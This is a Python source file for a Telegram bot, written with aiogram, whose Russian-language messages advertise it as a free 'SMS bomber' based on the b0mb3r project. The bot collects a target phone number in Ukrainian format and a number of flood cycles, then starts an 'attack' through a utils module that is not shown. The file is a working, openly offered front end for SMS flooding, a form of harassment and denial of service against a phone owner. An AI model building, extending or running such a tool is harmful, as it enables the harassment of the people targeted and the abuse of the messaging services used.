import logging
from aiogram import Bot, Dispatcher, executor, types
from aiogram.dispatcher.filters.builtin import Text
from aiogram.contrib.fsm_storage.memory import MemoryStorage
from aiogram.dispatcher import FSMContext
from config import TOKEN
from utils import Attack, start_attack

API_TOKEN = TOKEN #is contained in config.py

logging.basicConfig(level=logging.INFO)

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot, storage = MemoryStorage())

@dp.message_handler(commands=["help", "about"])
async def send_welcome(message: types.Message):
    await message.reply("Дороу, бро!\nЯ - бесплатный смс бомбер!\nСозданный с помощью библиотеки aiogram, а также открытого смс бомбера b0mb3r от crinny (https://github.com/crinny/b0mb3r).\nИсходный код можно найти на моём github(https://github.com/alex-lemeshinsky).\nЧтобы начать процес просто введите номер телефона в формате \"+380ХХХХХХХХХ\".")

@dp.message_handler(commands="start", state="*")
async def get_phone_number(message: types.Message):
    await message.answer("Введите номер телефона в формате \"+380ХХХХХХХХХ\"")
    await Attack.waiting_for_phone_number.set()

@dp.message_handler(state=Attack.waiting_for_phone_number, content_types=types.ContentTypes.TEXT)
async def get_number_of_cycles(message: types.Message, state: FSMContext):
    await state.update_data(phone_number = message.text)
    keyboard = types.ReplyKeyboardMarkup(resize_keyboard=True)
    for num_of_cyc in ["1", "2", "5", "10"]:
        keyboard.add(num_of_cyc)
    await Attack.next()
    await message.answer("Теперь введите количество циклов", reply_markup=keyboard)

@dp.message_handler(state=Attack.waiting_for_number_of_cycles, content_types=types.ContentTypes.TEXT)
async def gather_data_and_start_attack(message: types.Message, state: FSMContext):
    await state.update_data(number_of_cycles = message.text)
    attack_data = await state.get_data()
    responce = start_attack(attack_data["phone_number"], attack_data["number_of_cycles"])
    await message.answer(responce, reply_markup = types.reply_keyboard.ReplyKeyboardRemove())
    await state.finish()

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)